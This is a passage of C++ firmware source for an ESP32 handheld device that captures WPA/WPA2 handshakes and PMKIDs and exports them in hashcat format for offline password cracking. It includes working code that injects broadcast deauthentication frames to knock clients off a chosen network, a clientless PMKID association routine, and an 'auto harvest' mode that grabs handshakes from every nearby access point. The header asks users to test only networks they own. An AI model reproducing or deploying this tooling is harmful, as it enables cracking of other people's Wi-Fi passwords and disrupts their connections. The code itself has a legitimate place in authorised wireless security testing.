// handshake.cpp — WPA/WPA2 4-way handshake capture to SD (analysis)
// Part of DIVV2-CUSTOMFIRMWARE-PCB (DEMRCAN2)
//
// Flow:  WiFi scan  ->  pick YOUR OWN AP  ->  Passive / Active(deauth)  ->
//        listen on AP channel, grab EAPOL (+ beacon) frames,
//        write a standard .pcap (DLT 105 raw 802.11) into /handshakes/.
//
// Open the .pcap later on PC with aircrack-ng or convert with
// hcxpcapngtool -> hashcat mode 22000.
//
// LEGAL: use only on networks you own or are explicitly authorised to test.

#include "config.h"
#include "icon.h"
#include "esp_timer.h"

namespace HandshakeCapture {

// ───────────────────────── config ─────────────────────────
static const char* HS_DIR       = "/handshakes";
static const uint16_t HS_CAP     = 512;    // max bytes kept per frame (EAPOL/beacon fit easily)
static const uint8_t  HS_QLEN    = 16;     // ring slots (EAPOL frames are rare)
static const uint32_t DEAUTH_EVERY_MS = 2000;
static const uint8_t  DEAUTH_BURST     = 4;

// Theme-aware colors (match the rest of the firmware).
// ORANGE = uiUniversalColor() = the accent color chosen in Settings.
// Match the native WiFi Scanner / ProtoKill exactly: black content bg, font 1 size 1.
#define C_BG   BLACK          // feature content background (same as scanner/protokill)
#define C_TXT  UI_TEXT        // body text (white)
#define C_ORA  ORANGE         // accent / theme color (uiUniversalColor)
#define C_GRN  GREEN          // success / headers
#define C_RED  RED            // warning
#define C_GRY  GRAY           // muted
#define HS_HEADER_Y      44     // title row (just under the toolbar)
#define HS_FIRST_ROW_Y   66     // AP-list first row
#define HS_ROW_H         22
#define HS_LOG_TOP       62     // terminal first line (below title)
#define HS_LINE_H        12     // ProtoKill terminal line height
#define HS_BAR2          0x2104 // toolbar gray (distinct from UI_LABLE status bar)

// font used by native feature screens (scanner, protokill): the blocky GFX font
static inline void hsFont() { tft.setTextFont(1); tft.setTextSize(1); }

// ───────────────────────── pcap structs ─────────────────────────
struct __attribute__((packed)) PcapGlobalHeader {
  uint32_t magic_number; uint16_t version_major; uint16_t version_minor;
  int32_t thiszone; uint32_t sigfigs; uint32_t snaplen; uint32_t network;
};
struct __attribute__((packed)) PcapRecordHeader {
  uint32_t ts_sec; uint32_t ts_usec; uint32_t incl_len; uint32_t orig_len;
};
static const uint32_t PCAP_MAGIC   = 0xa1b2c3d4;
static const uint32_t DLT_80211    = 105;   // LINKTYPE_IEEE802_11 (raw, no radiotap)

// ───────────────────────── state ─────────────────────────
enum State { HS_HUB, HS_SCAN, HS_SELECT, HS_CAPTURE, HS_AUTO, HS_DONE, HS_ERR };
static State state = HS_HUB;

// detailed handshake hub (each type separate)
enum Hub { HUB_PASSIVE, HUB_ACTIVE, HUB_AUTO, HUB_PMKID, HUB_COUNT };
static int  hubSel = 0;
static Hub  hubChoice = HUB_PASSIVE;
static bool pmkidClientless = false;
static uint32_t assocMs = 0;
// locally-administered fake STA MAC used for clientless PMKID association
static uint8_t staMac[6] = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };

struct ApEntry { char ssid[33]; uint8_t bssid[6]; uint8_t ch; int8_t rssi; bool open; };
static ApEntry aps[24];
static int apCount = 0;
static int selIdx = 0;
static int viewTop = 0;

static ApEntry target;
static bool activeMode = false;

// capture bookkeeping (volatile = touched in sniffer task)
static volatile bool gotM1=false, gotM2=false, gotM3=false, gotM4=false;
static volatile uint32_t eapolCount=0, beaconCount=0, droppedCount=0;

// terminal log (ProtoKill-style scrolling output)
static const uint8_t HS_LOG_MAX = 18;
static String   hsLogBuf[HS_LOG_MAX];
static uint16_t hsLogCol[HS_LOG_MAX];
static int      hsLogN = 0;
static bool prevM1=false, prevM2=false, prevM3=false, prevM4=false, beaconLogged=false, pmkidLogged=false;

// extraction for validation + hashcat 22000 export (filled in the drain, main context)
static uint8_t  macAP[6], macSTA[6];
static uint8_t  anonce[32];      static bool haveAnonce = false;
static uint8_t  pmkid[16];       static bool havePmkid  = false;
static uint8_t  m2eapol[256];    static int  m2eapolLen = 0;
static uint8_t  m2mic[16];       static bool haveM2full = false;
static bool     crackableEAPOL = false, crackablePMKID = false;

// SD pcap
static File hsFile;
static String hsPath;
static bool hsLogging = false;

// ring queue (producer: sniffer task, consumer: hsLoop)
struct Slot { uint8_t data[HS_CAP]; uint16_t len; uint32_t ts_sec, ts_usec; };
static Slot* pool = nullptr;
static QueueHandle_t freeQ = nullptr;
static QueueHandle_t writeQ = nullptr;

static uint32_t lastDeauthMs = 0;
static bool uiDrawn = false;

// ───────────────────────── SD helpers ─────────────────────────
// Robust SD mount: clears the "gave up" latch and retries the remount a few times.
// isSDCardAvailable() can intermittently short-circuit to false while a radio
// feature is active, so every SD access goes through this first.
static bool sdReady() {
  for (int i = 0; i < 6; i++) {
    sdRetryMount();                       // clear latch -> allow remount
    if (isSDCardAvailable()) return true;
    delay(40);
  }
  return false;
}

// open a file for writing, remounting+retrying if the first attempt fails
static File sdOpenWrite(const char* path) {
  File f;
  for (int i = 0; i < 4; i++) {
    if (!sdReady()) { delay(40); continue; }
    f = SD.open(path, FILE_WRITE);
    if (f) return f;
    delay(40);
  }
  return f;   // invalid File on failure
}

static bool ensureDir() {
  if (!sdReady()) return false;
  if (SD.exists(HS_DIR)) return true;
  if (SD.mkdir(HS_DIR)) return true;
  if (SD.mkdir(HS_DIR + 1)) return true;   // retry without leading '/'
  // last resort: remount once more and retry
  if (!sdReady()) return false;
  return SD.exists(HS_DIR) || SD.mkdir(HS_DIR);
}

static void sanitize(char* dst, const char* src, size_t n) {
  size_t j = 0;
  for (size_t i = 0; src[i] && j < n - 1; i++) {
    char c = src[i];
    if ((c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_') dst[j++] = c;
  }
  if (j == 0) { dst[j++] = 'a'; dst[j++]='p'; }
  dst[j] = 0;
}

static bool openPcap() {
  if (!ensureDir()) return false;
  char ss[20]; sanitize(ss, target.ssid, sizeof(ss));
  char buf[80];
  for (uint16_t i = 0; i < 1000; i++) {
    snprintf(buf, sizeof(buf), "%s/%s_%02X%02X_%03u.pcap",
             HS_DIR, ss, target.bssid[4], target.bssid[5], (unsigned)i);
    if (!SD.exists(buf)) break;
  }
  hsFile = sdOpenWrite(buf);
  if (!hsFile) return false;
  hsPath = String(buf);
  PcapGlobalHeader gh{};
  gh.magic_number = PCAP_MAGIC; gh.version_major = 2; gh.version_minor = 4;
  gh.snaplen = 65535; gh.network = DLT_80211;
  if (hsFile.write((const uint8_t*)&gh, sizeof(gh)) != sizeof(gh)) { hsFile.close(); return false; }
  hsFile.flush();
  return true;
}

static void writeRecord(const Slot& s) {
  if (!hsFile) return;
  PcapRecordHeader rh;
  rh.ts_sec = s.ts_sec; rh.ts_usec = s.ts_usec;
  rh.incl_len = s.len; rh.orig_len = s.len;
  hsFile.write((const uint8_t*)&rh, sizeof(rh));
  hsFile.write(s.data, s.len);
}

// ───────────────────────── frame parsing ─────────────────────────
static inline bool bssidMatch(const uint8_t* p) {
  // addr1=p+4, addr2=p+10, addr3=p+16 ; AP bssid is usually addr3 (or addr1/2)
  return !memcmp(p+4,  target.bssid, 6) ||
         !memcmp(p+10, target.bssid, 6) ||
         !memcmp(p+16, target.bssid, 6);
}

// find LLC/SNAP + EAPOL ethertype (AA AA 03 00 00 00 88 8E); return EAPOL offset or -1
static int findEapol(const uint8_t* p, int len) {
  static const uint8_t sig[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
  int scan = len - 8; if (scan > 60) scan = 60;
  for (int i = 20; i <= scan; i++) {
    if (!memcmp(p + i, sig, 8)) return i + 8;
  }
  return -1;
}

// classify EAPOL-Key message 1..4 from Key Information field
static int eapolMsg(const uint8_t* e, int avail) {
  if (avail < 7) return 0;
  if (e[1] != 0x03) return 0;                 // EAPOL type must be Key(3)
  uint16_t ki = ((uint16_t)e[5] << 8) | e[6]; // Key Information
  bool mic     = ki & 0x0100;
  bool ack     = ki & 0x0080;
  bool install = ki & 0x0040;
  bool secure  = ki & 0x0200;
  if ( ack && !mic)               return 1;   // M1
  if (!ack &&  mic && !secure)    return 2;   // M2
  if ( ack &&  mic &&  install)   return 3;   // M3
  if (!ack &&  mic &&  secure)    return 4;   // M4
  return 0;
}

static inline bool handshakeReady() {
  // crackable pair: M1+M2 (or M2+M3)
  return gotM2 && (gotM1 || gotM3);
}

static inline bool nonZero(const uint8_t* b, int n) { uint8_t z=0; for(int i=0;i<n;i++) z|=b[i]; return z!=0; }

// EAPOL-Key body layout (offsets from EAPOL frame start e):
//  e+2..3 len | e+5..6 keyinfo | e+17..48 nonce | e+81..96 MIC | e+97..98 keydata len | e+99.. keydata
// Parse captured EAPOL (main context) to pull anonce (M1), MIC+frame (M2) and PMKID (M1 key data).
static void extractEapol(const uint8_t* p, int len) {
  int eo = findEapol(p, len);
  if (eo < 0) return;
  const uint8_t* e = p + eo;
  int avail = len - eo;
  if (avail < 99) return;
  int m = eapolMsg(e, avail);
  const uint8_t* a1 = p + 4; const uint8_t* a2 = p + 10;
  memcpy(macAP, target.bssid, 6);
  memcpy(macSTA, memcmp(a1, target.bssid, 6) ? a1 : a2, 6);
  if (m == 1) {
    memcpy(anonce, e + 17, 32); haveAnonce = true;
    uint16_t kdlen = ((uint16_t)e[97] << 8) | e[98];
    if (kdlen >= 20 && 99 + kdlen <= avail) {
      const uint8_t* kd = e + 99;
      for (int i = 0; i + 20 <= kdlen; i++) {
        if (kd[i]==0x00 && kd[i+1]==0x0F && kd[i+2]==0xAC && kd[i+3]==0x04) {
          memcpy(pmkid, kd + i + 4, 16);
          if (nonZero(pmkid, 16)) havePmkid = true;
          break;
        }
      }
    }
  } else if (m == 2) {
    memcpy(m2mic, e + 81, 16);
    int elen = 4 + (((int)e[2] << 8) | e[3]);   // full 802.1X EAPOL frame length
    if (elen >= 99 && elen <= (int)sizeof(m2eapol) && eo + elen <= len) {
      memcpy(m2eapol, e, elen); m2eapolLen = elen; haveM2full = true;
    }
  }
}

static void toHex(const uint8_t* b, int n, char* out) {
  static const char* h = "0123456789abcdef";
  for (int i = 0; i < n; i++) { out[2*i] = h[b[i] >> 4]; out[2*i+1] = h[b[i] & 0x0F]; }
  out[2*n] = 0;
}

// write hashcat 22000 lines (PMKID = WPA*01, EAPOL = WPA*02) next to the .pcap
static void write22000() {
  if (!(havePmkid || (haveAnonce && haveM2full))) return;
  String path = hsPath; path.replace(".pcap", ".22000");
  File f = sdOpenWrite(path.c_str());
  if (!f) return;
  char apx[13], stax[13], esx[66], buf[800];
  toHex(macAP, 6, apx); toHex(macSTA, 6, stax);
  toHex((const uint8_t*)target.ssid, strlen(target.ssid), esx);
  if (havePmkid) {
    char pmx[33]; toHex(pmkid, 16, pmx);
    snprintf(buf, sizeof(buf), "WPA*01*%s*%s*%s*%s***\n", pmx, apx, stax, esx);
    f.print(buf);
  }
  if (haveAnonce && haveM2full) {
    uint8_t cp[256]; memcpy(cp, m2eapol, m2eapolLen);
    if (m2eapolLen >= 97) memset(cp + 81, 0, 16);   // zero MIC inside the EAPOL copy
    char micx[33], anx[65], eapx[520];
    toHex(m2mic, 16, micx); toHex(anonce, 32, anx); toHex(cp, m2eapolLen, eapx);
    snprintf(buf, sizeof(buf), "WPA*02*%s*%s*%s*%s*%s*%s*00\n", micx, apx, stax, esx, anx, eapx);
    f.print(buf);
  }
  f.flush(); f.close();
}

// ───────────────────────── promiscuous sniffer (wifi task) ─────────────────────────
static void enqueue(const uint8_t* buf, uint16_t len) {
  if (!freeQ || !writeQ || !pool) return;
  if (len > HS_CAP) len = HS_CAP;
  uint8_t idx;
  if (xQueueReceive(freeQ, &idx, 0) != pdTRUE) { droppedCount++; return; }
  Slot& s = pool[idx];
  int64_t us = esp_timer_get_time();
  s.ts_sec = (uint32_t)(us / 1000000LL);
  s.ts_usec = (uint32_t)(us % 1000000LL);
  s.len = len;
  memcpy(s.data, buf, len);
  if (xQueueSend(writeQ, &idx, 0) != pdTRUE) { xQueueSend(freeQ, &idx, 0); droppedCount++; }
}

static volatile bool harvestMode = false;   // true = capture EAPOL/beacons from ALL APs

static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24 || len > 1600) return;
  const uint8_t* p = pkt->payload;
  const uint8_t fc = p[0];

  if (harvestMode) {
    // harvest: always take EAPOL (rare, critical); throttle beacons 1/8 so they
    // don't starve the queue but we still learn SSIDs over time.
    if (type == WIFI_PKT_MGMT) {
      static uint32_t bcn = 0;
      if (fc == 0x80 && (bcn++ & 7) == 0) enqueue(p, (uint16_t)len);
      return;
    }
    if (type != WIFI_PKT_DATA) return;
    if (findEapol(p, len) < 0) return;
    eapolCount++;
    enqueue(p, (uint16_t)len);
    return;
  }

  if (type == WIFI_PKT_MGMT) {
    // beacon (0x80) from target -> keep a few for ESSID context
    if (fc == 0x80 && beaconCount < 3 && !memcmp(p+16, target.bssid, 6)) {
      beaconCount++;
      enqueue(p, (uint16_t)len);
    }
    return;
  }
  if (type != WIFI_PKT_DATA) return;
  if (!bssidMatch(p)) return;

  int eo = findEapol(p, len);
  if (eo < 0) return;
  int m = eapolMsg(p + eo, len - eo);
  if (m == 1) gotM1 = true;
  else if (m == 2) gotM2 = true;
  else if (m == 3) gotM3 = true;
  else if (m == 4) gotM4 = true;
  eapolCount++;
  enqueue(p, (uint16_t)len);
}

// ───────────────────────── raw inject (STA iface) ─────────────────────────
static uint8_t deauthFrame[26] = {
  0xC0,0x00, 0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // dst = broadcast
  0,0,0,0,0,0,                     // src  = BSSID (filled)
  0,0,0,0,0,0,                     // bssid (filled)
  0x00,0x00, 0x07,0x00             // seq + reason 7
};
static void sendDeauthBurst() {
  memcpy(&deauthFrame[10], target.bssid, 6);
  memcpy(&deauthFrame[16], target.bssid, 6);
  for (uint8_t i = 0; i < DEAUTH_BURST; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    delay(2);
  }
}

// ── clientless PMKID: associate to the AP ourselves so it sends EAPOL M1 (with PMKID) ──
static void send80211(uint8_t* f, int n) { esp_wifi_80211_tx(WIFI_IF_STA, f, n, false); }

static void sendAuth() {                       // open-system authentication, seq 1
  uint8_t f[30] = {
    0xB0,0x00, 0x00,0x00,
    0,0,0,0,0,0,  0,0,0,0,0,0,  0,0,0,0,0,0,  0x00,0x00,
    0x00,0x00, 0x01,0x00, 0x00,0x00 };        // algo=open, seq=1, status=0
  memcpy(f+4,  target.bssid, 6);
  memcpy(f+10, staMac, 6);
  memcpy(f+16, target.bssid, 6);
  send80211(f, sizeof(f));
}

static void sendAssoc() {                      // association request with RSN (WPA2-PSK CCMP)
  uint8_t f[128]; int n = 0;
  uint8_t hdr[24] = { 0x00,0x00, 0x00,0x00, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x10,0x00 };
  memcpy(hdr+4,  target.bssid, 6); memcpy(hdr+10, staMac, 6); memcpy(hdr+16, target.bssid, 6);
  memcpy(f, hdr, 24); n = 24;
  f[n++] = 0x31; f[n++] = 0x04;                // capability info (ESS+privacy)
  f[n++] = 0x0a; f[n++] = 0x00;                // listen interval
  int sl = strlen(target.ssid); if (sl > 32) sl = 32;   // SSID IE
  f[n++] = 0x00; f[n++] = sl; memcpy(f+n, target.ssid, sl); n += sl;
  static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
  memcpy(f+n, rates, sizeof(rates)); n += sizeof(rates);   // supported rates
  static const uint8_t rsn[] = {0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,
                                0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00};
  memcpy(f+n, rsn, sizeof(rsn)); n += sizeof(rsn);         // RSN IE (CCMP, PSK)
  send80211(f, n);
}

static void doAssociate() { sendAuth(); delay(4); sendAssoc(); }

// ───────────────────────── radio control ─────────────────────────
static void startSniff() {
  // queues + pool
  if (!pool)   pool   = (Slot*)malloc(sizeof(Slot) * HS_QLEN);
  if (!freeQ)  freeQ  = xQueueCreate(HS_QLEN, sizeof(uint8_t));
  if (!writeQ) writeQ = xQueueCreate(HS_QLEN, sizeof(uint8_t));
  if (pool && freeQ) { for (uint8_t i = 0; i < HS_QLEN; i++) xQueueSend(freeQ, &i, 0); }

  WiFi.mode(WIFI_STA);
  WiFi.setTxPower(WIFI_POWER_19_5dBm);   // max TX power for capture range
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
}

static void stopSniff() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

// ───────────────────────── cleanup ─────────────────────────
static void hsStop() {
  stopSniff();
  // drain remaining frames to disk
  if (writeQ && freeQ && pool && hsFile) {
    uint8_t idx;
    while (xQueueReceive(writeQ, &idx, 0) == pdTRUE) { writeRecord(pool[idx]); xQueueSend(freeQ, &idx, 0); }
  }
  if (hsFile) { hsFile.flush(); hsFile.close(); }
  hsLogging = false;
  if (writeQ) { vQueueDelete(writeQ); writeQ = nullptr; }
  if (freeQ)  { vQueueDelete(freeQ);  freeQ  = nullptr; }
  if (pool)   { free(pool); pool = nullptr; }
}

// ───────────────────────── UI ─────────────────────────
static int hsBottom() { return featureHasTouchNavBar() ? touchNavContentBottomY() : 320; }

// footer control cards (same bar the other menus use): left,down,center,up,right
static void hsNav(const char* l, const char* d, const char* c, const char* u, const char* r) {
  setTouchNavLabels(l, d, c, u, r);
  redrawTouchButtonBar();
}

// gray toolbar under the status bar: back (left) + optional rescan (right)
static void hsTopBar(bool rescan) {
  tft.fillRect(0, 20, 240, 16, HS_BAR2);
  tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, C_TXT);
  if (rescan) tft.drawBitmap(214, 20, bitmap_icon_undo, 16, 16, C_TXT);
}

// native feature frame: black content + status bar (UI_LABLE) + divider line + gray toolbar
static void header(const char* t, bool rescan = false, uint16_t titleCol = C_ORA) {
  featureClearContent(C_BG);
  drawStatusBar(readBatteryVoltage(), true, false);
  tft.drawFastHLine(0, 19, 240, UI_LINE);   // the divider line between status bar and toolbar
  hsTopBar(rescan);
  hsFont();
  tft.setTextColor(titleCol, C_BG);
  tft.setCursor(6, HS_HEADER_Y);
  tft.print(t);
}

// native WiFi-Scanner style: ">NN: SSID...  -53 dBm Ch 3 WPA2", monospace columns
static void drawList() {
  header("Networks:", true, C_GRN);
  const int rowH = 22;
  const int top = HS_FIRST_ROW_Y;
  int rows = (hsBottom() - top) / rowH;
  if (rows < 1) rows = 1;
  if (selIdx < viewTop) viewTop = selIdx;
  if (selIdx >= viewTop + rows) viewTop = selIdx - rows + 1;
  // page indicator (green), right of the header
  int pages = (apCount + rows - 1) / rows;
  hsFont(); tft.setTextColor(C_GRN, C_BG);
  tft.setCursor(185, HS_HEADER_Y); tft.printf("Page %d/%d", (viewTop / rows) + 1, pages < 1 ? 1 : pages);
  for (int r = 0; r < rows; r++) {
    int i = viewTop + r;
    int y = top + r * rowH;
    tft.fillRect(0, y, 240, rowH, C_BG);
    if (i >= apCount) continue;
    bool sel = (i == selIdx);
    char ssid[16];
    strncpy(ssid, aps[i].ssid, 11); ssid[11] = 0;
    if (strlen(aps[i].ssid) > 11) strcat(ssid, "...");
    char buf[48];
    snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s",
             i + 1, ssid, aps[i].rssi, aps[i].ch, aps[i].open ? "OPEN" : "WPA2");
    tft.setCursor(2, y);  tft.setTextColor(sel ? C_ORA : C_BG, C_BG); tft.print(sel ? ">" : " ");
    tft.setCursor(10, y); tft.setTextColor(sel ? C_ORA : C_TXT, C_BG); tft.print(buf);
  }
  hsNav(nullptr, "Down", "Exit", "Up", "Select");
}

// detailed handshake hub: each capture type on its own row
static const char* HUB_NAMES[HUB_COUNT] = {
  "Passive Capture", "Active Capture", "Auto Harvest", "PMKID Clientless"
};
static const char* HUB_DESC[HUB_COUNT] = {
  "listen only, wait for client", "deauth to force a handshake",
  "hop channels, grab every AP", "associate, no client needed"
};
// terminal-style selector (ProtoKill look): lines going down, [>] marks the choice
static void drawHub() {
  header("Handshake", false, C_GRN);
  hsFont();
  const int top = HS_LOG_TOP;
  tft.fillRect(0, top, 240, hsBottom() - top, C_BG);
  tft.setTextColor(C_GRY, C_BG);
  tft.setCursor(5, top); tft.print("[*] select capture mode:");
  for (int i = 0; i < HUB_COUNT; i++) {
    int y = top + (i + 2) * HS_LINE_H;
    bool sel = (i == hubSel);
    tft.setTextColor(sel ? C_ORA : C_TXT, C_BG);
    tft.setCursor(5, y);
    tft.print(sel ? "[>] " : "[ ] "); tft.print(HUB_NAMES[i]);
  }
  int dy = top + (HUB_COUNT + 3) * HS_LINE_H;
  tft.setTextColor(C_GRY, C_BG);
  tft.setCursor(5, dy); tft.print("[*] "); tft.print(HUB_DESC[hubSel]);
  hsNav(nullptr, "Down", "Exit", "Up", "Select");
}

// ───────────────────────── terminal log ─────────────────────────
// ProtoKill-style terminal: caller supplies the full line (incl. "[+] "/"[*] " prefix)
static void hsLog(const char* msg, uint16_t col = C_TXT) {
  if (hsLogN < HS_LOG_MAX) {
    hsLogBuf[hsLogN] = msg; hsLogCol[hsLogN] = col; hsLogN++;
  } else {
    for (int i = 0; i < HS_LOG_MAX - 1; i++) { hsLogBuf[i] = hsLogBuf[i+1]; hsLogCol[i] = hsLogCol[i+1]; }
    hsLogBuf[HS_LOG_MAX-1] = msg; hsLogCol[HS_LOG_MAX-1] = col;
  }
  const int top = HS_LOG_TOP;
  hsFont();
  tft.fillRect(0, top, 240, hsBottom() - top, C_BG);
  for (int i = 0; i < hsLogN; i++) {
    tft.setTextColor(hsLogCol[i], C_BG);
    tft.setCursor(5, top + i * HS_LINE_H);
    tft.print(hsLogBuf[i]);
  }
}

static void hsLogClear() { hsLogN = 0; }

// append result lines to the same terminal (no long SD path -> never overflows)
static void drawDone() {
  if (crackableEAPOL) hsLog("[+] VALID HANDSHAKE (M1+M2)", C_GRN);
  if (crackablePMKID) hsLog("[+] PMKID VALID", C_GRN);
  const char* ck = (crackableEAPOL || crackablePMKID)
                 ? (crackableEAPOL ? "[+] CRACKABLE: YES (M1+M2 Valid)" : "[+] CRACKABLE: YES (PMKID)")
                 : "[!] saved pcap - verify on PC";
  hsLog(ck, (crackableEAPOL || crackablePMKID) ? C_ORA : C_RED);
  char l[48];
  snprintf(l, sizeof(l), "[*] EAPOL:%u  PMKID:%s", (unsigned)eapolCount, havePmkid ? "yes" : "no");
  hsLog(l, C_GRY);
  hsLog("[*] saved to /handshakes (.pcap+.22000)", C_GRY);
  hsNav(nullptr, nullptr, "Back", nullptr, nullptr);
}

static void waitRelease(int b){ while (isButtonPressed(b)) delay(5); }

// ───────────────────────── scan ─────────────────────────
static void doScan() {
  header("WiFi Scan", false, C_GRN);
  hsFont(); tft.setTextColor(C_GRN, C_BG); tft.setCursor(6, HS_HEADER_Y + 22); tft.print("please wait...");
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(80);
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  int n = WiFi.scanNetworks(false, true);
  apCount = 0;
  for (int i = 0; i < n && apCount < (int)(sizeof(aps)/sizeof(aps[0])); i++) {
    ApEntry& a = aps[apCount];
    String raw = WiFi.SSID(i);
    strncpy(a.ssid, raw.length()? raw.c_str() : "<hidden>", 32); a.ssid[32]=0;
    const uint8_t* b = WiFi.BSSID(i); if (b) memcpy(a.bssid, b, 6);
    a.ch = WiFi.channel(i); a.rssi = WiFi.RSSI(i);
    a.open = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
    apCount++;
  }
  WiFi.scanDelete();
  selIdx = 0; viewTop = 0;
  state = (apCount > 0) ? HS_SELECT : HS_ERR;
}

// ───────────────────────── public entry points ─────────────────────────
void hsSetup() {
  // idempotent cleanup from a previous run
  hsStop();
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  harvestMode = false; pmkidClientless = false;
  gotM1=gotM2=gotM3=gotM4=false;
  eapolCount=beaconCount=droppedCount=0;
  haveAnonce=havePmkid=haveM2full=false; m2eapolLen=0;
  crackableEAPOL=crackablePMKID=false; pmkidLogged=false;
  activeMode=false; uiDrawn=false; hsPath="";
  hubSel = 0;
  state = HS_HUB;
  drawHub();
}

static void startAuto();        // fwd decl (harvester launcher)
static void harvestTick();      // fwd decl (harvester per-loop body)

// open pcap + sniffer for a single target, then enter the capture terminal
static bool beginCapture() {
  hsLogging = openPcap();
  if (!hsLogging) {
    state = HS_ERR; header("SD error"); hsFont(); tft.setTextColor(C_RED,C_BG);
    tft.setCursor(6, HS_HEADER_Y + 22); tft.print("No SD / open failed");
    hsNav(nullptr, nullptr, "Back", nullptr, nullptr); return false;
  }
  startSniff();
  lastDeauthMs = assocMs = 0;
  header("Handshake capture", false, C_GRN);
  hsNav(nullptr, nullptr, "Stop", nullptr, nullptr);
  prevM1=prevM2=prevM3=prevM4=beaconLogged=pmkidLogged=false;
  hsLogClear();
  char l[48];
  snprintf(l, sizeof(l), "[*] target: %.16s ch%d", target.ssid, target.ch); hsLog(l, C_ORA);
  if (pmkidClientless)  hsLog("[*] PMKID clientless - associating", C_ORA);
  else if (activeMode)  hsLog("[*] ACTIVE mode - deauth on", C_ORA);
  else                  hsLog("[*] PASSIVE mode - listening", C_ORA);
  hsLog("[+] capture started", C_GRN);
  state = HS_CAPTURE;
  return true;
}

void hsLoop() {
  maintainTouchNavBar();   // keep the footer control cards drawn/responsive
  switch (state) {

    case HS_HUB: {
      if (isButtonPressed(BTN_DOWN)) { hubSel = (hubSel+1)%HUB_COUNT; drawHub(); waitRelease(BTN_DOWN); delay(80); }
      else if (isButtonPressed(BTN_UP)) { hubSel = (hubSel-1+HUB_COUNT)%HUB_COUNT; drawHub(); waitRelease(BTN_UP); delay(80); }
      else if (isButtonPressed(BTN_RIGHT)) {
        waitRelease(BTN_RIGHT);
        hubChoice = (Hub)hubSel;
        activeMode      = (hubChoice == HUB_ACTIVE);
        pmkidClientless = (hubChoice == HUB_PMKID);
        if (hubChoice == HUB_AUTO) { startAuto(); break; }   // no AP pick needed
        doScan();                                            // Passive/Active/PMKID -> pick AP
        if (state == HS_SELECT) drawList();
        else if (state == HS_ERR) {
          header("No networks found"); hsFont(); tft.setTextColor(C_TXT, C_BG);
          tft.setCursor(6, HS_HEADER_Y + 22); tft.print("none found - go back");
          hsNav(nullptr, nullptr, "Back", nullptr, nullptr);
        }
        delay(120);
      }
      break;
    }

    case HS_SELECT: {
      if (isButtonPressed(BTN_DOWN)) { selIdx = (selIdx+1)%apCount; drawList(); waitRelease(BTN_DOWN); delay(60); }
      else if (isButtonPressed(BTN_UP)) { selIdx = (selIdx-1+apCount)%apCount; drawList(); waitRelease(BTN_UP); delay(60); }
      else if (isButtonPressed(BTN_LEFT)) { state = HS_HUB; drawHub(); waitRelease(BTN_LEFT); delay(120); }
      else if (isButtonPressed(BTN_RIGHT)) {               // RIGHT = choose this AP -> start
        target = aps[selIdx];
        waitRelease(BTN_RIGHT);
        beginCapture();
        delay(120);
      }
      break;
    }

    case HS_AUTO: {
      harvestTick();
      break;
    }

    case HS_CAPTURE: {
      // drain captured frames: write to pcap AND parse EAPOL for anonce/MIC/PMKID
      if (writeQ && freeQ && pool) {
        uint8_t idx; int drained = 0;
        while (drained < 8 && xQueueReceive(writeQ, &idx, 0) == pdTRUE) {
          writeRecord(pool[idx]);
          extractEapol(pool[idx].data, pool[idx].len);
          xQueueSend(freeQ, &idx, 0); drained++;
        }
        if (drained) hsFile.flush();
      }
      // active deauth to trigger reconnect
      if (activeMode && !handshakeReady()) {
        uint32_t now = millis();
        if (now - lastDeauthMs > DEAUTH_EVERY_MS) { sendDeauthBurst(); lastDeauthMs = now; hsLog("[+] deauth sent", C_RED); }
      }
      // clientless PMKID: keep (re)associating until the AP sends M1/PMKID
      if (pmkidClientless && !havePmkid) {
        uint32_t now = millis();
        if (now - assocMs > 1500) { doAssociate(); assocMs = now; hsLog("[+] assoc request sent", C_RED); }
      }
      // log new events as they arrive (ProtoKill-style [+] lines)
      if (beaconCount && !beaconLogged) { beaconLogged = true; hsLog("[+] beacon captured", C_GRY); }
      if (gotM1 && !prevM1) { prevM1 = true; hsLog("[+] EAPOL M1  (AP)",     C_GRN); }
      if (gotM2 && !prevM2) { prevM2 = true; hsLog("[+] EAPOL M2  (client)", C_GRN); }
      if (gotM3 && !prevM3) { prevM3 = true; hsLog("[+] EAPOL M3  (AP)",     C_GRN); }
      if (gotM4 && !prevM4) { prevM4 = true; hsLog("[+] EAPOL M4  (client)", C_GRN); }
      if (havePmkid && !pmkidLogged) { pmkidLogged = true; hsLog("[+] PMKID captured!", C_ORA); }
      // done when a crackable handshake (M1+M2) or a PMKID is in hand
      if (handshakeReady() || havePmkid) {
        // flush the whole queue first so anonce/MIC/PMKID are all extracted
        if (writeQ && freeQ && pool) {
          uint8_t idx;
          while (xQueueReceive(writeQ, &idx, 0) == pdTRUE) {
            writeRecord(pool[idx]); extractEapol(pool[idx].data, pool[idx].len); xQueueSend(freeQ, &idx, 0);
          }
          hsFile.flush();
        }
